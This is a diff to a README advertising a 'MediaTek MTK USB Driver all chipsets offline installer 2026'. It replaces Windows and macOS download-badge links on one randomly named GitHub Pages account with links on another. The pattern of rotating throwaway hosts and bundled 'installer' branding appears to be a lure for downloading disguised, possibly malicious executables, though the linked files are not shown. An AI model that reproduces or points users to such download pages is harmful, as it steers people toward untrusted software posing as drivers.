@@ -4,8 +4,8 @@
 
 **MediaTek MTK USB Driver all chipsets offline installer 2026**
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://DenFencerStare.github.io/win-get/)
-[![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://DenFencerStare.github.io/mac-get/)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://DikeSupporterFurnish.github.io/windows-installer/)
+[![Download for macOS](https://img.shields.io/badge/Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://DikeSupporterFurnish.github.io/macos-installer/)
 
 </div>
 
@@ -48,9 +48,9 @@
 
 <div align="center">
 
-[![Windows Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows)](https://DenFencerStare.github.io/win-get/)
+[![Windows Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows)](https://DikeSupporterFurnish.github.io/windows-installer/)
 
-[![macOS Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20for%20macOS-000000?style=for-the-badge&logo=apple)](https://DenFencerStare.github.io/mac-get/)
+[![macOS Download](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20for%20macOS-000000?style=for-the-badge&logo=apple)](https://DikeSupporterFurnish.github.io/macos-installer/)
 
 </div>
 
